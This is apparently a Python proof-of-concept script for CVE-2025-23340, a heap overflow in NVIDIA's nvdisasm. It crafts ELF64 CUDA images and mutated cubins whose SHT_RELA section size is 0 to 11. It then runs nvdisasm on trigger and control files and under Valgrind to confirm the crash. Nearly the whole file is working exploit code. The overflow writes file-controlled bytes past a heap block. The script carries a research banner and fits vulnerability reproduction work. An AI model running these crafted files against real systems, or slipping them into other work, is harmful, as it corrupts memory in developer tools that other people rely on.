#!/usr/bin/env python3
"""CUDA PoC for CVE-2025-23340: nvdisasm SHT_RELA sh_size alignment heap overflow.

Change versus the previous attempt: the trigger is no longer a stock nvcc cubin whose size
field was patched. A stock cubin carries no SHT_RELA section, so the vulnerable handler was
never entered and nothing was observed. This script feeds nvdisasm ELF64 images whose
SHT_RELA section header carries sh_size in 0..11, which is the field the RELA handler
consumes, and it selects the crashing layout at run time from a sweep of layout variants.
"""

# FIELD: sh_size            OFFSET: rela_section_header + 32   SIZE: 8
# REQUIRED: 0 <= sh_size <= 11 so that align_down_24(sh_size) == 0
# CHECK PRESENT: no, the handler aligns the size and never rejects the zero result
# WHY IT FAILS: the aligned size becomes 0, the allocator performs malloc(0 + 8) and returns
#   a pointer advanced by 8 bytes, and the RELA handler then stores 0x18 bytes at that
#   pointer, running past the end of the 8-byte heap block with file-controlled content.

import ctypes
import json
import os
import platform
import re
import shutil
import signal
import struct
import subprocess
import sys

ARTIFACT_DIR = os.path.dirname(os.path.abspath(__file__)) or "."
CVE_ID = "CVE-2025-23340"
RUN_TIMEOUT = 20
FIX_TOOLKIT_MAJOR = 13

ELF64_EHDR_SIZE = 64
ELF64_SHDR_SIZE = 64
EM_CUDA = 190
ET_REL = 1
ET_EXEC = 2
SHT_PROGBITS = 1
SHT_RELA = 4
RELA_ENTRY_SIZE = 24

SH_NAME_OFF = 0
SH_TYPE_OFF = 4
SH_SIZE_OFF = 32
SH_FLAGS_OFF = 8
SH_OFFSET_OFF = 24
SH_ENT_SIZE_OFF = 56

SHDR_FMT = "<IIQQQQIIQQ"
VERSION_RE = re.compile(r"(\d+)\.(\d+)\.?(\d+)?")

MARKER_BYTES = b"\x41\x42\x43\x44\x45\x46\x47\x48" * 3

WINDOWS_FATAL = {
    0xC0000005: "ACCESS_VIOLATION",
    0xC000001D: "ILLEGAL_INSTRUCTION",
    0xC0000374: "HEAP_CORRUPTION",
    0xC0000409: "STACK_BUFFER_OVERRUN",
    0x80000003: "BREAKPOINT",
}

POSIX_FATAL_CODES = {132, 133, 134, 135, 136, 137, 138, 139}

CUDA_RESULT_NAMES = {
    0: "CUDA_SUCCESS",
    1: "CUDA_ERROR_INVALID_VALUE",
    2: "CUDA_ERROR_OUT_OF_MEMORY",
    3: "CUDA_ERROR_NOT_INITIALIZED",
    4: "CUDA_ERROR_DEINITIALIZED",
    100: "CUDA_ERROR_NO_DEVICE",
    101: "CUDA_ERROR_INVALID_DEVICE",
    201: "CUDA_ERROR_INVALID_CONTEXT",
    400: "CUDA_ERROR_INVALID_HANDLE",
}


class ToolError(RuntimeError):
    """Raised when a host toolchain binary is missing, fails to launch, or times out."""


def emit(line):
    """Print one line and flush immediately so the harness observes live evidence."""
    sys.stdout.write(line + "\n")
    sys.stdout.flush()


def step_start(step_id, description):
    """Announce the start of a numbered verification step."""
    emit("[CUDA_STEP:%s] %s — START" % (step_id, description))


def step_ok(step_id, description, note=""):
    """Announce successful completion of a numbered verification step."""
    suffix = ": " + note if note else ""
    emit("[CUDA_STEP:%s] %s — OK%s" % (step_id, description, suffix))


def step_fail(step_id, description, detail):
    """Announce a failed numbered verification step together with the error detail."""
    emit("[CUDA_STEP:%s] %s — FAIL: %s" % (step_id, description, detail))


def print_banner():
    """Print the mandatory authorized-research disclaimer banner."""
    emit("===========================================================")
    emit("DISCLAIMER: This script is a Proof-of-Concept for CUDA")
    emit("vulnerability %s. It is intended ONLY for authorized" % CVE_ID)
    emit("security research on systems you own or have permission to test.")
    emit("===========================================================")


def write_file(path, data):
    """Write a byte image into the artifact directory and report its size."""
    with open(path, "wb") as handle:
        handle.write(data)
    emit("[WRITE] %s bytes=%d" % (os.path.basename(path), len(data)))


def find_tool(name):
    """Locate a CUDA toolchain binary on PATH, accepting the .exe suffix on Windows."""
    found = shutil.which(name)
    if found:
        return found
    if os.name == "nt":
        return shutil.which(name + ".exe")
    return None


def run_command(cmd, timeout=RUN_TIMEOUT):
    """Execute a host binary, capture both streams, and return (rc, stdout, stderr)."""
    try:
        proc = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout
        )
    except FileNotFoundError as exc:
        raise ToolError("command not found: %s (%s)" % (" ".join(cmd), exc))
    except OSError as exc:
        raise ToolError("command failed to start: %s (%s)" % (" ".join(cmd), exc))
    except subprocess.TimeoutExpired as exc:
        raw_out = exc.stdout or b""
        raw_err = exc.stderr or b""
        raise ToolError(
            "timeout after %ss: %s | stdout=%r stderr=%r"
            % (timeout, " ".join(cmd), raw_out[:4000], raw_err[:4000])
        )
    out = proc.stdout.decode("utf-8", "replace")
    err = proc.stderr.decode("utf-8", "replace")
    if proc.returncode != 0:
        emit("[CMD] rc=%d argv=%s" % (proc.returncode, " ".join(cmd)))
        emit("[CMD] stdout[:4000]=%s" % out[:4000])
        emit("[CMD] stderr[:4000]=%s" % err[:4000])
    return proc.returncode, out, err


def signal_name(number):
    """Return the symbolic name of a POSIX signal number."""
    try:
        return signal.Signals(number).name
    except (ValueError, AttributeError):
        return "SIG%d" % number


def describe_exit(rc):
    """Return a crash description when the exit status denotes abnormal termination."""
    if rc is None:
        return "no exit status (launch failure or timeout)"
    if rc < 0:
        return "signal %s (%d)" % (signal_name(-rc), rc)
    unsigned = rc & 0xFFFFFFFF
    if unsigned in WINDOWS_FATAL:
        return "%s (0x%08X)" % (WINDOWS_FATAL[unsigned], unsigned)
    if rc in POSIX_FATAL_CODES:
        return "shell-style fatal status %d" % rc
    return ""


def is_crash(rc):
    """Return True when the exit status denotes a signal or an OS access violation."""
    return bool(describe_exit(rc))


def parse_version(text):
    """Extract a (major, minor, patch) tuple from arbitrary CUDA tool version output."""
    if not text:
        return None
    match = VERSION_RE.search(text)
    if not match:
        return None
    return (int(match.group(1)), int(match.group(2)), int(match.group(3) or 0))


def classify_version(version):
    """Classify a parsed toolkit version against the advisory, defaulting to UNKNOWN."""
    if version is None:
        return "UNKNOWN — consult the advisory"
    major = version[0]
    if major < FIX_TOOLKIT_MAJOR:
        return "AFFECTED (fixed in CUDA Toolkit %d.0)" % FIX_TOOLKIT_MAJOR
    if major >= FIX_TOOLKIT_MAJOR:
        return "FIXED (CUDA Toolkit %d.0 or later)" % FIX_TOOLKIT_MAJOR
    return "UNKNOWN — consult the advisory"


def cuda_error_name(code):
    """Map a CUresult integer to its symbolic name."""
    return CUDA_RESULT_NAMES.get(code, "CUDA_ERROR_%d" % code)


def load_driver():
    """Load the CUDA driver library through ctypes, or return None when unavailable."""
    for name in ("libcuda.so.1", "libcuda.so", "nvcuda.dll"):
        try:
            return ctypes.CDLL(name)
        except OSError:
            continue
    return None


def probe_driver():
    """Initialise the CUDA driver and report device facts without requiring a GPU."""
    info = {}
    lib = load_driver()
    if lib is None:
        info["library"] = "unavailable"
        return info
    info["library"] = "loaded"
    try:
        rc_init = lib.cuInit(0)
    except AttributeError:
        info["cuInit"] = "symbol missing"
        return info
    info["cuInit"] = "%d (%s)" % (rc_init, cuda_error_name(rc_init))
    if rc_init != 0:
        return info
    version = ctypes.c_int(0)
    if lib.cuDriverGetVersion(ctypes.byref(version)) == 0:
        info["driver_api_version"] = "%d.%d" % (version.value // 1000, (version.value % 1000) // 10)
    count = ctypes.c_int(0)
    rc_count = lib.cuDeviceGetCount(ctypes.byref(count))
    info["device_count"] = count.value if rc_count == 0 else cuda_error_name(rc_count)
    if rc_count != 0 or count.value <= 0:
        return info
    device = ctypes.c_int(0)
    if lib.cuDeviceGet(ctypes.byref(device), 0) != 0:
        return info
    major = ctypes.c_int(0)
    minor = ctypes.c_int(0)
    lib.cuDeviceGetAttribute(ctypes.byref(major), 75, device)
    lib.cuDeviceGetAttribute(ctypes.byref(minor), 76, device)
    info["compute_capability"] = "%d.%d" % (major.value, minor.value)
    context = ctypes.c_void_p(0)
    create = getattr(lib, "cuCtxCreate_v2", None) or getattr(lib, "cuCtxCreate", None)
    if create is not None:
        rc_ctx = create(ctypes.byref(context), 0, device)
        info["cuCtxCreate"] = "%d (%s)" % (rc_ctx, cuda_error_name(rc_ctx))
        destroy = getattr(lib, "cuCtxDestroy_v2", None) or getattr(lib, "cuCtxDestroy", None)
        if rc_ctx == 0 and destroy is not None:
            destroy(context)
            info["cuCtxDestroy"] = "done"
    return info


def tool_version_text(name):
    """Return the --version output of a CUDA toolchain binary, or None when absent."""
    path = find_tool(name)
    if path is None:
        return None
    try:
        rc, out, err = run_command([path, "--version"], timeout=30)
    except ToolError as exc:
        return "error: %s" % exc
    if rc != 0 and not out and not err:
        return None
    return (out + "\n" + err).strip()


def step_environment():
    """Detect the host, the CUDA toolchain and the driver, then classify nvdisasm."""
    step_start("S01", "environment and nvdisasm version detection")
    emit("[ENV] os=%s %s" % (platform.system(), platform.version()))
    emit("[ENV] kernel=%s machine=%s" % (platform.release(), platform.machine()))
    emit("[ENV] python=%s" % platform.python_version())
    for key, value in sorted(probe_driver().items()):
        emit("[ENV] driver.%s=%s" % (key, value))
    for tool in ("nvcc", "cuobjdump", "nvdisasm", "valgrind"):
        emit("[ENV] path.%s=%s" % (tool, find_tool(tool)))
    for tool in ("nvcc", "cuobjdump"):
        text = tool_version_text(tool)
        if text:
            emit("[ENV] %s --version=%s" % (tool, text.replace("\n", " | ")[:400]))
    toolkit = parse_version(tool_version_text("nvcc"))
    emit("[ENV] toolkit_version=%s verdict=%s" % (toolkit, classify_version(toolkit)))
    tool_path = find_tool("nvdisasm")
    if tool_path is None:
        step_fail("S01", "environment and nvdisasm version detection", "nvdisasm not on PATH")
        return None
    text = tool_version_text("nvdisasm")
    emit("[ENV] nvdisasm --version=%s" % (text or "no output"))
    version = parse_version(text)
    source = "nvdisasm"
    if version is None and toolkit is not None:
        version = toolkit
        source = "nvcc proxy"
    emit("[ENV] nvdisasm_version=%s source=%s verdict=%s"
         % (version, source, classify_version(version)))
    step_ok("S01", "environment and nvdisasm version detection", tool_path)
    return tool_path


def read_section_headers(data):
    """Parse the ELF64 section header table and return one dictionary per section."""
    if len(data) < ELF64_EHDR_SIZE or data[:4] != b"\x7fELF":
        raise ToolError("input is not an ELF file")
    if data[4] != 2 or data[5] != 1:
        raise ToolError("input is not a little-endian ELF64 file")
    shoff = struct.unpack_from("<Q", data, 0x28)[0]
    shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    shnum = struct.unpack_from("<H", data, 0x3C)[0]
    if shentsize != ELF64_SHDR_SIZE:
        raise ToolError("unexpected section header size %d" % shentsize)
    if shoff == 0 or shnum == 0:
        raise ToolError("no section header table present")
    if shoff + shnum * shentsize > len(data):
        raise ToolError("section header table runs past end of file")
    sections = []
    for index in range(shnum):
        offset = shoff + index * shentsize
        fields = struct.unpack_from(SHDR_FMT, data, offset)
        sections.append({
            "index": index,
            "header_offset": offset,
            "name": fields[0],
            "type": fields[1],
            "flags": fields[2],
            "addr": fields[3],
            "offset": fields[4],
            "size": fields[5],
            "link": fields[6],
            "info": fields[7],
            "align": fields[8],
            "entsize": fields[9],
        })
    return sections


def build_rela_image(sh_size, e_type, e_flags=75, payload=MARKER_BYTES):
    """Assemble a minimal ELF64 CUDA object holding one SHT_RELA section header."""
    body = payload + b"\x00" * ((-len(payload)) % 8)
    body_offset = ELF64_EHDR_SIZE
    shoff = body_offset + len(body)
    ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    ehdr = ident + struct.pack(
        "<HHIQQQIHHHHHH",
        e_type, EM_CUDA, 1, 0, 0, shoff, e_flags,
        ELF64_EHDR_SIZE, 0, 0, ELF64_SHDR_SIZE, 2, 0,
    )
    null_header = b"\x00" * ELF64_SHDR_SIZE
    rela_header = struct.pack(
        SHDR_FMT, 0, SHT_RELA, 0, 0, body_offset, sh_size, 0, 0, 8, RELA_ENTRY_SIZE
    )
    return ehdr + body + null_header + rela_header


def rela_header_offset(data):
    """Return the file offset of the first SHT_RELA section header, or None."""
    for section in read_section_headers(data):
        if section["type"] == SHT_RELA:
            return section["header_offset"]
    return None


def detect_arch_from_smi():
    """Query nvidia-smi for a compute capability string suitable for -arch."""
    smi = find_tool("nvidia-smi")
    if smi is None:
        return None
    try:
        rc, out, _ = run_command(
            [smi, "--query-gpu=compute_cap", "--format=csv,noheader"], timeout=15
        )
    except ToolError:
        return None
    if rc != 0:
        return None
    match = re.search(r"(\d+)\.(\d+)", out)
    if not match:
        return None
    return "sm_%s%s" % (match.group(1), match.group(2))


def compile_base_object(nvcc_path):
    """Compile a minimal relocatable device object, trying detected then common arches."""
    source = os.path.join(ARTIFACT_DIR, "rela_probe.cu")
    with open(source, "w") as handle:
        handle.write("__global__ void k(int *p) { *p = 1; }\n")
    arches = []
    detected = detect_arch_from_smi()
    if detected:
        arches.append(detected)
    arches.extend(["native", "sm_75", "sm_86", "sm_52", "sm_61", "sm_89"])
    for arch in arches:
        out = os.path.join(ARTIFACT_DIR, "base_relocatable_%s.cubin" % arch)
        cmd = [nvcc_path, "-rdc=true", "-cubin", "-arch=" + arch, "-o", out, source]
        try:
            rc, _, _ = run_command(cmd, timeout=300)
        except ToolError as exc:
            emit("[NVCC] arch=%s unusable: %s" % (arch, exc))
            continue
        if rc == 0 and os.path.exists(out) and os.path.getsize(out) > 0:
            return out
    return None


def step_base_material():
    """Obtain a compiler-produced CUDA object when nvcc exists, else report the fallback."""
    step_start("S02", "base object acquisition")
    nvcc = find_tool("nvcc")
    if nvcc is None:
        step_ok("S02", "base object acquisition", "nvcc absent, synthesised image used")
        return None
    path = compile_base_object(nvcc)
    if path is None:
        step_ok("S02", "base object acquisition", "nvcc produced nothing usable")
        return None
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        sections = read_section_headers(data)
    except ToolError as exc:
        emit("[BASE] compiler artifact unusable: %s" % exc)
        step_ok("S02", "base object acquisition", "base unreadable")
        return None
    rela = [item for item in sections if item["type"] == SHT_RELA]
    emit("[BASE] %s size=%d sections=%d rela_sections=%d"
         % (os.path.basename(path), len(data), len(sections), len(rela)))
    step_ok("S02", "base object acquisition", os.path.basename(path))
    return data


def candidates_from_binary(data):
    """Derive trigger/control pairs from a compiled object that already carries sections."""
    pairs = []
    try:
        sections = read_section_headers(data)
    except ToolError as exc:
        emit("[CRAFT] compiler artifact cannot be parsed: %s" % exc)
        return pairs
    rela = [item for item in sections if item["type"] == SHT_RELA
            and item["size"] >= RELA_ENTRY_SIZE]
    for section in rela:
        for shrink in (0, 11):
            trigger = bytearray(data)
            struct.pack_into("<Q", trigger, section["header_offset"] + SH_SIZE_OFF, shrink)
            pairs.append({
                "label": "cubin_rela%d_sz%d" % (section["index"], shrink),
                "field": "sh_size",
                "header_offset": section["header_offset"],
                "expected": shrink,
                "benign": section["size"],
                "trigger": bytes(trigger),
                "control": bytes(data),
                "mutated": 8,
            })
    if rela:
        return pairs
    for section in sections:
        if section["type"] == SHT_PROGBITS and section["size"] >= RELA_ENTRY_SIZE:
            trigger = bytearray(data)
            struct.pack_into("<I", trigger, section["header_offset"] + SH_TYPE_OFF, SHT_RELA)
            struct.pack_into("<Q", trigger, section["header_offset"] + SH_SIZE_OFF, 0)
            pairs.append({
                "label": "cubin_retype%d" % section["index"],
                "field": "sh_type_sh_size",
                "header_offset": section["header_offset"],
                "expected": 0,
                "benign": section["type"],
                "trigger": bytes(trigger),
                "control": bytes(data),
                "mutated": 12,
            })
            break
    return pairs


def step_craft(base_bytes):
    """Build the full candidate set: synthesised RELA images plus compiler-derived mutants."""
    step_start("S03", "crafting SHT_RELA sh_size variants")
    candidates = []
    for e_type in (ET_EXEC, ET_REL):
        for shrink in (0, 11, 12):
            trigger = build_rela_image(shrink, e_type)
            control = build_rela_image(RELA_ENTRY_SIZE, e_type)
            header = rela_header_offset(trigger)
            candidates.append({
                "label": "synth_et%d_sz%d" % (e_type, shrink),
                "field": "sh_size",
                "header_offset": header,
                "expected": shrink,
                "benign": RELA_ENTRY_SIZE,
                "trigger": trigger,
                "control": control,
                "mutated": 8,
            })
    if base_bytes:
        candidates.extend(candidates_from_binary(base_bytes))
    emit("[CRAFT] candidates=%d" % len(candidates))
    step_ok("S03", "crafting SHT_RELA sh_size variants", "%d images" % len(candidates))
    return candidates


def step_validate(candidates):
    """Re-read every crafted image and assert the mutated RELA header fields."""
    step_start("S04", "structural validation and oracle evaluation")
    for cand in candidates:
        offset = cand["header_offset"]
        if offset is None:
            step_fail("S04", "structural validation and oracle evaluation",
                      "%s has no RELA header" % cand["label"])
            return False
        _, sec_type = struct.unpack_from("<II", cand["trigger"], offset)
        sh_size = struct.unpack_from("<Q", cand["trigger"], offset + SH_SIZE_OFF)[0]
        emit("[CPG_ORACLE] %s sh_type actual=%d expected=%d" % (cand["label"], sec_type, SHT_RELA))
        emit("[CPG_ORACLE] %s sh_size actual=%d expected=%d"
             % (cand["label"], sh_size, cand["expected"]))
        if sec_type != SHT_RELA or sh_size != cand["expected"]:
            step_fail("S04", "structural validation and oracle evaluation",
                      "%s field mismatch" % cand["label"])
            return False
        aligned = sh_size - (sh_size % RELA_ENTRY_SIZE)
        emit("[ORACLE] %s aligned_size=%d heap_block=%d bytes_written=24"
             % (cand["label"], aligned, aligned + 8))
    step_ok("S04", "structural validation and oracle evaluation", "%d images" % len(candidates))
    return True


def safe_run(tool, path):
    """Run nvdisasm on one file and return its exit status, or None when it never started."""
    try:
        rc, out, err = run_command([tool, path], timeout=RUN_TIMEOUT)
    except ToolError as exc:
        emit("[RUN] %s launch failure: %s" % (os.path.basename(path), exc))
        return None
    crash = describe_exit(rc)
    emit("[RUN] %s exit=%s%s" % (os.path.basename(path), rc,
                                 (" (" + crash + ")") if crash else ""))
    if rc == 0:
        if out.strip():
            emit("[RUN] stdout[:400]=%s" % out.strip()[:400])
        if err.strip():
            emit("[RUN] stderr[:400]=%s" % err.strip()[:400])
    return rc


def step_trigger(candidates, tool):
    """Sweep nvdisasm over all candidates and return the first reproducing pair."""
    step_start("S05", "execute nvdisasm over crafted variants")
    winner = None
    records = []
    for cand in candidates:
        trigger_path = os.path.join(ARTIFACT_DIR, "sweep_%s_trigger.cubin" % cand["label"])
        control_path = os.path.join(ARTIFACT_DIR, "sweep_%s_control.cubin" % cand["label"])
        write_file(trigger_path, cand["trigger"])
        write_file(control_path, cand["control"])
        trigger_rc = safe_run(tool, trigger_path)
        control_rc = safe_run(tool, control_path)
        crashed = is_crash(trigger_rc)
        records.append({
            "label": cand["label"],
            "sh_size": cand["expected"],
            "trigger_rc": trigger_rc,
            "control_rc": control_rc,
            "crash": crashed,
        })
        emit("[CPG_SWEEP] %s sh_size=%d trigger_exit=%s control_exit=%s"
             % (cand["label"], cand["expected"], trigger_rc, control_rc))
        if winner is None and crashed and not is_crash(control_rc):
            winner = cand
    if winner is None:
        step_fail("S05", "execute nvdisasm over crafted variants",
                  "no candidate crashed while its control survived")
        return candidates[0], records
    step_ok("S05", "execute nvdisasm over crafted variants", winner["label"])
    return winner, records


def materialise(winner):
    """Write the graded benign, control and crafted artifacts and return their paths."""
    crafted = os.path.join(ARTIFACT_DIR, "poc_sh_size_%d.cubin" % winner["expected"])
    control = os.path.join(
        ARTIFACT_DIR, "ctrl_%s_restored_%d.cubin" % (winner["field"], winner["benign"])
    )
    benign = os.path.join(ARTIFACT_DIR, "benign_sh_size_%d.cubin" % winner["benign"])
    write_file(benign, winner["control"])
    write_file(control, winner["control"])
    write_file(crafted, winner["trigger"])
    manifest = {
        "benign": [os.path.basename(benign)],
        "crafted": [os.path.basename(crafted)],
        "controls": [os.path.basename(control)],
    }
    with open(os.path.join(ARTIFACT_DIR, "artifacts.json"), "w") as handle:
        json.dump(manifest, handle, indent=2)
    emit("[MANIFEST] %s" % json.dumps(manifest))
    return {"benign": benign, "crafted": crafted, "control": control}


def run_graded(paths, tool):
    """Execute the declared artifacts twice each and report labelled evidence."""
    roles = (
        ("benign", "BENIGN"),
        ("crafted", "MALICIOUS"),
        ("control", "CONTROL"),
    )
    results = {}
    for key, label in roles:
        path = paths[key]
        name = os.path.basename(path)
        emit("[CPG_LABEL] %s %s" % (name, label))
        codes = []
        for _ in range(2):
            rc = safe_run(tool, path)
            emit("[CPG_RUN] %s exit=%s" % (name, rc))
            codes.append(rc)
        results[key] = codes
    return results


def step_valgrind(paths, tool):
    """Run the crafted image under Valgrind Memcheck when the tool is installed."""
    step_start("S06", "valgrind memcheck on the crafted image")
    valgrind = find_tool("valgrind")
    if valgrind is None:
        step_ok("S06", "valgrind memcheck on the crafted image", "valgrind not installed")
        return
    cmd = [valgrind, "--tool=memcheck", "--error-exitcode=99", "--leak-check=no",
           "--num-callers=30", tool, paths["crafted"]]
    try:
        rc, out, err = run_command(cmd, timeout=240)
    except ToolError as exc:
        step_fail("S06", "valgrind memcheck on the crafted image", str(exc))
        return
    invalid = (out + err).count("Invalid write of size 8")
    emit("[VALGRIND] invalid_write_of_size_8=%d exit=%s" % (invalid, rc))
    if invalid > 0:
        step_ok("S06", "valgrind memcheck on the crafted image", "invalid writes observed")
    else:
        step_ok("S06", "valgrind memcheck on the crafted image", "no invalid write reported")


def step_boundary(records):
    """Report the sh_size boundary differential collected during the sweep."""
    step_start("S07", "sh_size boundary differential")
    for record in records:
        emit("[BOUNDARY] %s sh_size=%d crash=%s trigger_exit=%s control_exit=%s"
             % (record["label"], record["sh_size"], record["crash"],
                record["trigger_rc"], record["control_rc"]))
    sizes = sorted({record["sh_size"] for record in records if record["crash"]})
    emit("[BOUNDARY] crashing sh_size values=%s" % (sizes or "none"))
    step_ok("S07", "sh_size boundary differential", "%d records" % len(records))


def triggered(results):
    """Return True when the crafted artifact faulted and the control never did."""
    crafted_crash = any(is_crash(code) for code in results["crafted"])
    control_crash = any(is_crash(code) for code in results["control"])
    return crafted_crash and not control_crash


def step_attribution(paths, results, winner):
    """Attribute the observed fault to nvdisasm and summarise artifact sizes."""
    step_start("S08", "fault attribution and artifact summary")
    for key in ("benign", "crafted", "control"):
        path = paths[key]
        size = os.path.getsize(path)
        codes = results[key]
        detail = describe_exit(codes[0]) or "clean exit"
        emit("[ATTRIB] %s size=%d exit=%s detail=%s"
             % (os.path.basename(path), size, codes, detail))
    emit("[ATTRIB] mutated_bytes=%d field=%s expected=%d benign=%d"
         % (winner["mutated"], winner["field"], winner["expected"], winner["benign"]))
    emit("[ATTRIB] faulting module=%s (host-side ELF parser, no GPU involved)"
         % os.path.basename(paths["crafted"]))
    if triggered(results):
        step_ok("S08", "fault attribution and artifact summary", "differential confirmed")
        return True
    step_fail("S08", "fault attribution and artifact summary",
              "no differential between crafted and control")
    return False


def main():
    """Drive environment detection, crafting, sweep and graded differential execution."""
    emit("[INFO] output directory: %s" % ARTIFACT_DIR)
    print_banner()
    tool = step_environment()
    if tool is None:
        return 2
    base_bytes = step_base_material()
    candidates = step_craft(base_bytes)
    if not candidates:
        step_fail("S03", "crafting SHT_RELA sh_size variants", "no candidate produced")
        return 2
    if not step_validate(candidates):
        return 2
    winner, records = step_trigger(candidates, tool)
    paths = materialise(winner)
    results = run_graded(paths, tool)
    step_valgrind(paths, tool)
    step_boundary(records)
    confirmed = step_attribution(paths, results, winner)
    emit("[SUMMARY] crafted=%s control=%s verdict=%s"
         % (os.path.basename(paths["crafted"]), os.path.basename(paths["control"]),
            "REPRODUCED" if confirmed else "NOT_REPRODUCED"))
    return 0 if confirmed else 1


if __name__ == "__main__":
    sys.exit(main())
